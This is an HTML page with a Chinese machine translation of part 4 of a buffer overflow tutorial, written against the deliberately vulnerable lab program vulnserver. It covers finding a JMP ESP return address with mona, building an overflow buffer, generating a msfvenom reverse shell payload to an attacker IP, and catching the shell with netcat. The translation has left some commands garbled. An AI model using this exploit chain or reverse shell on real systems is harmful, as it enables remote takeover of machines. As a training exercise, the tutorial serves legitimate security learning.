<html>
<head>
<title>Buffer overflow tutorial (part 4)</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">缓冲区溢出教程(第 4 部分)</h1>
<blockquote>原文：<a href="https://blog.devgenius.io/buffer-overflow-tutorial-part4-1e80e90a2f03?source=collection_archive---------5-----------------------#2020-07-08">https://blog.devgenius.io/buffer-overflow-tutorial-part4-1e80e90a2f03?source=collection_archive---------5-----------------------#2020-07-08</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi jn"><img src="../Images/9ecf2131d8ac4251c66c30c182e90282.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*3Ehi3odcfj8oWTXpR9fPmg.jpeg"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">安加德·辛格·www.officialhacker.com</figcaption></figure><h1 id="8949" class="kc kd iq bd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz bi translated">8 —寻找合适的模块</h1><p id="92e5" class="pw-post-body-paragraph la lb iq lc b ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ij bi translated">当我们谈论找到正确的模块时，我们说的是—我们正在搜索一个<em class="ly">“dll”</em>文件或程序中没有内存保护的类似文件。即使没有真正的方法来利用应用程序进行批判性思维，我们也可以使用<em class="ly">“Mona . py”</em>模块来为 Immunity Debugger 自动执行这些烦人的逐字节比较。您可以从以下 GitHub 页面下载<em class="ly">【Mona . py】</em>文件:<em class="ly"/><a class="ae lz" href="https://github.com/corelan/mona" rel="noopener ugc nofollow" target="_blank"><em class="ly">https://github.com/corelan/mona</em></a><em class="ly">。”</em></p><p id="a04f" class="pw-post-body-paragraph la lb iq lc b ld ma lf lg lh mb lj lk ll mc ln lo lp md lr ls lt me lv lw lx ij bi translated">提取文件并将<em class="ly"> "Mona.py" </em>复制到<em class="ly">" C:\ Program Files \ Immunity Inc \ Immunity Debugger \ py commands。"</em>文件夹<em class="ly">。</em></p><figure class="mg mh mi mj gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mf"><img src="../Images/b7b92fe1a346a84c128d90d956881c7b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*mlZnywflxD4CnzALb9oiXA.jpeg"/></div></div></figure><p id="2bed" class="pw-post-body-paragraph la lb iq lc b ld ma lf lg lh mb lj lk ll mc ln lo lp md lr ls lt me lv lw lx ij bi translated">将文件复制到<em class="ly">“py commands”</em>文件夹后，可以调用它，并列出免疫调试器中的所有模块。在列出模块之前，确保<em class="ly">“vulnserver”</em>正在运行并连接到调试器。然后，从免疫调试器使用搜索字段键入<em class="ly">"！莫娜模块"</em>并敲击<em class="ly">"回车."</em></p><figure class="mg mh mi mj gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mk"><img src="../Images/f760b91c694cda506df2cd926b8f1a81.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*n5O6ehyOeTH7pgbtv0xiiA.jpeg"/></div></div></figure><p id="180f" class="pw-post-body-paragraph la lb iq lc b ld ma lf lg lh mb lj lk ll mc ln lo lp md lr ls lt me lv lw lx ij bi translated">它将显示所有模块及其保护设置。这里我们需要查找一个附加到<em class="ly">“vulnserver”</em>并且所有保护设置都为<em class="ly">“False”的文件</em>在本例中，我们发现<em class="ly"> "essfunc.dll" </em>的所有内容都设置为 false。</p><figure class="mg mh mi mj gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ml"><img src="../Images/3edd0938c7326c1e714b6b7abf61fba2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*8bvo_kQmn4CgTswnrCr0bw.jpeg"/></div></div></figure><p id="d4cc" class="pw-post-body-paragraph la lb iq lc b ld ma lf lg lh mb lj lk ll mc ln lo lp md lr ls lt me lv lw lx ij bi translated">接下来，我们应该找到一个与<em class="ly">“JMP”</em>(跳转命令)等价的操作码。为此，我们需要从 Kali Linux 终端<em class="ly">使用<em class="ly"> "nasm_shell.rb" </em>脚本。</em></p><p id="5f70" class="pw-post-body-paragraph la lb iq lc b ld ma lf lg lh mb lj lk ll mc ln lo lp md lr ls lt me lv lw lx ij bi translated"><strong class="lc ir"><em class="ly">Ex:</em></strong><em class="ly">(</em><strong class="lc ir"><em class="ly">root @ kali</em></strong><em class="ly">:~ #/usr/share/metasploit-framework/tools/exploit/nasm _ shell . Rb)。</em></p><p id="df43" class="pw-post-body-paragraph la lb iq lc b ld ma lf lg lh mb lj lk ll mc ln lo lp md lr ls lt me lv lw lx ij bi translated">在这里，我们试图将汇编语言转换成十六进制代码，并找到跳转命令<em class="ly">“JMP ESP”的等效代码</em><em class="ly">【JMP ESP】</em>指令，它让我们通过<em class="ly">【EIP】</em>控制程序执行，并降落到我们的用户控制空间，其中将包含我们的外壳代码。在<em class="ly">“nasm _ shell”</em>中输入<em class="ly">“JMP ESP”</em>，点击<em class="ly">“回车”</em>然后记下跳转命令的十六进制代码，即<em class="ly">“FFE 4”。</em></p><figure class="mg mh mi mj gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mm"><img src="../Images/6e70ed9229608a0856f24886f3ec4f25.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*7tcGNTIpyfdmap9ZtwaNmA.jpeg"/></div></div></figure><p id="7e51" class="pw-post-body-paragraph la lb iq lc b ld ma lf lg lh mb lj lk ll mc ln lo lp md lr ls lt me lv lw lx ij bi translated">现在，我们需要使用 Mona 的这个信息(FFE4)来查找使用(essfunc.dll)模块的跳转命令的返回地址。为此，请键入<em class="ly">"！mona 在免疫调试器的搜索字段中查找-s "\xff\xe4" -m essfunc.dll" </em>。</p><figure class="mg mh mi mj gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mn"><img src="../Images/3c954b49b73009446367c54610929827.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*0E2qEaW2HaP9ErQ04F6yyA.jpeg"/></div></div></figure><p id="4a2c" class="pw-post-body-paragraph la lb iq lc b ld ma lf lg lh mb lj lk ll mc ln lo lp md lr ls lt me lv lw lx ij bi translated">当你点击<em class="ly">“回车”，</em>它会显示回邮地址。我们需要做笔记并记下其中一个地址，以便稍后在 python 脚本中使用。在这个例子中，我们将注意到第一个地址，即<em class="ly">“625011 af”。</em></p><p id="e2a6" class="pw-post-body-paragraph la lb iq lc b ld ma lf lg lh mb lj lk ll mc ln lo lp md lr ls lt me lv lw lx ij bi translated">现在，我们可以修改我们的 python 脚本，并在指定(<em class="ly"> "A" </em> * 2003)缓冲字符后，以相反的顺序(<em class="ly"> "\xaf\x11\x50\x62" </em>)添加我们记录的返回地址。</p><figure class="mg mh mi mj gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mo"><img src="../Images/f41ed7dc716bf6bc3e0135aa22148ce9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*O-Z0hjGXn0aI7Dl93gvcxw.jpeg"/></div></div></figure><p id="1200" class="pw-post-body-paragraph la lb iq lc b ld ma lf lg lh mb lj lk ll mc ln lo lp md lr ls lt me lv lw lx ij bi translated">在 2003 字节的初始缓冲区之后，将<em class="ly">“JMP ESP”</em>的内存地址添加到我们的脚本中，我们可以覆盖<em class="ly">“EIP”</em>在运行这个脚本之前，让我们在<em class="ly">“JMP ESP”</em>指令处设置一个断点，这样我们可以在提交输入后手动单步执行指令。为此，单击调试器中的蓝色箭头图标，并键入我们之前提到的返回地址值。</p><figure class="mg mh mi mj gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mp"><img src="../Images/7e1abc286ea75baaa4b333e253e200dd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*CifBXflIrovzaEpffjKzMQ.jpeg"/></div></div></figure><p id="4663" class="pw-post-body-paragraph la lb iq lc b ld ma lf lg lh mb lj lk ll mc ln lo lp md lr ls lt me lv lw lx ij bi translated">一旦你点击<em class="ly">“OK”</em>按钮，它将定位特定的跳转代码并显示在屏幕顶部。要设置断点，突出显示地址并点击<em class="ly">“F2”</em>或双击地址的十六进制值。</p><figure class="mg mh mi mj gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mq"><img src="../Images/02de0de5487a9e0bafeec1c09cb40dd8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*YFw5znpfuC8_N9AGNLSk8g.jpeg"/></div></div></figure><p id="c458" class="pw-post-body-paragraph la lb iq lc b ld ma lf lg lh mb lj lk ll mc ln lo lp md lr ls lt me lv lw lx ij bi translated">设置好一切后，运行 python 脚本并分析更改。</p><figure class="mg mh mi mj gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mr"><img src="../Images/624e30a2672605d0d18e5b6e67c59072.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*a6sPCurGwxoMdOMrupYBZA.jpeg"/></div></div></figure><p id="3118" class="pw-post-body-paragraph la lb iq lc b ld ma lf lg lh mb lj lk ll mc ln lo lp md lr ls lt me lv lw lx ij bi translated">所以，这里发生的事情是，当我们到达断点时，程序已经停止，并且<em class="ly">“EIP”</em>已经被我们在 python 脚本中指定的值覆盖。这意味着我们完全控制了<em class="ly">【EIP】</em>，并且可以运行任何外壳代码来危害我们的目标机器。</p><h1 id="3bdb" class="kc kd iq bd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz bi translated">9-生成外壳代码并获得访问权限</h1><p id="e988" class="pw-post-body-paragraph la lb iq lc b ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ij bi translated">在漏洞开发过程的这个阶段，是时候生成外壳代码了。在这个例子中，我们将使用 msfvenom 创建一个反向 shell 负载。Msfvenom 是有效载荷生成和编码的组合。要创建 shellcode 我们需要执行以下命令:<em class="ly">(</em><strong class="lc ir"><em class="ly">root @ kali</em></strong><em class="ly">:~ # MSF venom—platform Windows-p Windows/shell _ reverse _ TCP LHOST = 10 . 10 . 10 . 15 LPORT = 4444 exit func = thread-f c-a x86-b " \ x00 ")。</em>我们来分解一下，分析一下命令。首先，我们调用该工具，然后使用<em class="ly">-p "</em>操作符指定 Windows 操作系统的有效负载(<em class="ly">Windows/shell _ reverse _ TCP</em>)。接下来，我们提供了攻击者机器的 IP 地址(<em class="ly"> LHOST </em>)和端口号(<em class="ly"> LPORT </em>)来监听传入的连接。然后我们使用了<em class="ly"> "EXITFUNC=thread" </em>命令来使漏洞利用更加稳定(这是可选的)。我们希望将所有内容导出到 C 文件类型中，所以我们指定了<em class="ly">-f "</em>操作符。接下来，我们使用<em class="ly">-b "</em>选项提供了目标机器的架构<em class="ly">-a x86 "</em>和一个坏角色。</p><figure class="mg mh mi mj gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ms"><img src="../Images/a2975d571c724c7f578a53e1f2106c92.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*lHipQaLvRRAsbuxwBp94uQ.jpeg"/></div></div></figure><p id="7f8e" class="pw-post-body-paragraph la lb iq lc b ld ma lf lg lh mb lj lk ll mc ln lo lp md lr ls lt me lv lw lx ij bi translated">一旦你点击<em class="ly">“回车”，</em>就会产生一个有效载荷。我们需要复制并在我们的 python 脚本中使用它。</p><p id="4d50" class="pw-post-body-paragraph la lb iq lc b ld ma lf lg lh mb lj lk ll mc ln lo lp md lr ls lt me lv lw lx ij bi translated">用任何文本编辑器打开 python 脚本，声明一个像<em class="ly">【溢出】</em>或任何你喜欢的变量，然后粘贴有效负载。</p><p id="8fce" class="pw-post-body-paragraph la lb iq lc b ld ma lf lg lh mb lj lk ll mc ln lo lp md lr ls lt me lv lw lx ij bi translated">接下来，我们必须通过提供几个(<em class="ly"> "\x90" </em>无操作)填充<em class="ly">，将有效载荷的这个变量添加到<em class="ly">"外壳代码"</em>变量中。</em></p><p id="7cf5" class="pw-post-body-paragraph la lb iq lc b ld ma lf lg lh mb lj lk ll mc ln lo lp md lr ls lt me lv lw lx ij bi translated"><strong class="lc ir"><em class="ly">Ex:</em></strong><em class="ly">(shellcode = " A " * 2003+" \ xaf \ X11 \ x50 \ x62 "+" \ x90 " * 32+溢出)。</em></p><p id="3bfd" class="pw-post-body-paragraph la lb iq lc b ld ma lf lg lh mb lj lk ll mc ln lo lp md lr ls lt me lv lw lx ij bi translated">我们使用这种类型的填充来确保 jump 命令和我们的有效载荷之间没有干扰。</p><figure class="mg mh mi mj gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mt"><img src="../Images/63edabc24bdb81902d705e1aca4d0820.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*rorUeqt5n4BqpGHgaqqwqA.jpeg"/></div></div></figure><p id="de3d" class="pw-post-body-paragraph la lb iq lc b ld ma lf lg lh mb lj lk ll mc ln lo lp md lr ls lt me lv lw lx ij bi translated">完成所有工作后，保存脚本并在目标机器上运行它。在执行脚本之前，确保<em class="ly">“vulnserver”</em>软件在目标机器上以管理员身份运行。</p><figure class="mg mh mi mj gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mu"><img src="../Images/a3a6ed8b9024a1d49901e06f73943372.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*h7fSNDgloN6WnSoF4COtTA.jpeg"/></div></div></figure><p id="9479" class="pw-post-body-paragraph la lb iq lc b ld ma lf lg lh mb lj lk ll mc ln lo lp md lr ls lt me lv lw lx ij bi translated">最后，我们可以启动一个 Netcat 监听器来捕获反向 shell 连接，并通过执行我们创建的 python 脚本将我们的漏洞利用缓冲区发送给应用程序。</p><p id="e291" class="pw-post-body-paragraph la lb iq lc b ld ma lf lg lh mb lj lk ll mc ln lo lp md lr ls lt me lv lw lx ij bi translated"><strong class="lc ir"><em class="ly">Ex:</em></strong><em class="ly">(</em><strong class="lc ir"><em class="ly">root @ kali</em></strong><em class="ly">:~ # NC-nvlp 4444)。</em></p><figure class="mg mh mi mj gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mv"><img src="../Images/15d00b5ffe2179214a1775df20ca71ee.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*FEvucc0DPw45ZzgYouCebQ.jpeg"/></div></div></figure><p id="af92" class="pw-post-body-paragraph la lb iq lc b ld ma lf lg lh mb lj lk ll mc ln lo lp md lr ls lt me lv lw lx ij bi translated">正如您在上面的截图中看到的，一旦 python 脚本被执行，您将接收到反向 shell 连接，并将完全控制目标机器。</p></div><div class="ab cl mw mx hu my" role="separator"><span class="mz bw bk na nb nc"/><span class="mz bw bk na nb nc"/><span class="mz bw bk na nb"/></div><div class="ij ik il im in"><p id="8b98" class="pw-post-body-paragraph la lb iq lc b ld ma lf lg lh mb lj lk ll mc ln lo lp md lr ls lt me lv lw lx ij bi translated"><a class="ae lz" href="https://medium.com/@nuriddin.artykow/buffer-overflow-tutorial-part1-efc6b9f3e4ee" rel="noopener">缓冲区溢出教程(第一部分)</a></p><p id="b53e" class="pw-post-body-paragraph la lb iq lc b ld ma lf lg lh mb lj lk ll mc ln lo lp md lr ls lt me lv lw lx ij bi translated"><a class="ae lz" href="https://medium.com/@nuriddin.artykow/buffer-overflow-tutorial-part2-c21c6de5c11c" rel="noopener">缓冲区溢出教程(第二部分)</a></p><p id="e9d0" class="pw-post-body-paragraph la lb iq lc b ld ma lf lg lh mb lj lk ll mc ln lo lp md lr ls lt me lv lw lx ij bi translated"><a class="ae lz" href="https://medium.com/@nuriddin.artykow/buffer-overflow-tutorial-part3-98ab394073e3" rel="noopener">缓冲区溢出教程(第三部分)</a></p><p id="941a" class="pw-post-body-paragraph la lb iq lc b ld ma lf lg lh mb lj lk ll mc ln lo lp md lr ls lt me lv lw lx ij bi translated"><a class="ae lz" href="https://medium.com/dev-genius/buffer-overflow-tutorial-part4-1e80e90a2f03" rel="noopener">缓冲区溢出教程(第四部分)</a></p></div></div>    
</body>
</html>